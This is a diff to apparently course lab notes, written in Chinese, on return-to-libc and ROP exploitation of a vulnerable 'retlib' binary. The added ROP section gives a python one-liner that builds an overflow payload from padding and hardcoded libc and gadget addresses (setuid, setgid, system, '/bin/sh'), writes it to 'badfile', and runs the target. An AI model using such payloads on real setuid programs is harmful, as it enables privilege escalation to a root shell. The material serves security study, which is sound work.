@@ -166,3 +166,14 @@ Return to Libc
     python -c 'print "A"*24 + "\xb0\xfd\xe3\xb7" + "\xe0\x39\xe3\xb7" +"\x2b\x0b\xf6\xb7"' > badfile
     ./retlib
 ![image](https://github.com/user-attachments/assets/7078dd06-c7f2-4d3f-8cd8-ce23cff82a0b)
+
+ROP
+---
+    找到uid、gid、rop機器語言的值
+![image](https://github.com/user-attachments/assets/b41c79f3-911e-49a0-9939-eb09b2b6eae9)
+
+    將找到的值和原本的值組合在一起
+    python -c 'print "A"*24 + "\xc0\x63\xeb\xb7" + "\x45\x83\x04\x08" + "\x00\x00\x00\x00" + "\x40\x64\xeb\xb7" + "\x45\x83\x04\x08" + "\x00\x00\x00\x00" + "\xb0\xfd\xe3\xb7" + "\xe0\x39\xe3\xb7" + "\x2b\x0b\xf6\xb7"' > badfile
+    ./retlib
+![image](https://github.com/user-attachments/assets/00357a78-1916-499b-a588-9104ae49dc26)
+
